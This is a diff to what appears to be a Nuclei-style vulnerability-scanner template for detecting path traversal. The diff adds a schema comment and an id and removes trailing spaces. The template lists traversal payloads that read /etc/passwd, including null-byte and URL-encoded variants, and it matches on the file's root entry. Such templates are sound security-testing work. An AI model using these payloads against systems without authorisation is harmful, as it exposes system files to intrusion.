@@ -1,3 +1,5 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: path-traversal
 template:
    name: path-traversal
    severity: high
@@ -5,7 +7,7 @@ template:
    description: Path Traversal etc/passwd Disclosure
 
 request:
-   payloads: 
+   payloads:
       - "../../../../../../etc/passwd"
       - "../../../../../../etc/passwd%00"
       - "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
@@ -14,5 +16,5 @@ request:
    paths: false
 response:
    statusCode: 200
-   patterns: 
+   patterns:
       - "root:x:0:0:root"
